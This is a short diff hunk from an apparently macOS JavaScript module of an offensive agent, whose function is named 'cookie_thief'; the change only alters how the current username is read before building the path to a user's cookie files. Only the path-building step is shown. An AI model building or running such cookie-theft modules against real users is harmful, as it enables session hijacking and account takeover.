@@ -19,7 +19,7 @@ exports.cookie_thief = function(task, command, params){
         username = config['username'];
     }
     else {
-        username = $.NSUserName().js;
+        username = ObjC.unwrap($.NSUserName());
     }
     cookiepath = homedir + username + "/";
 
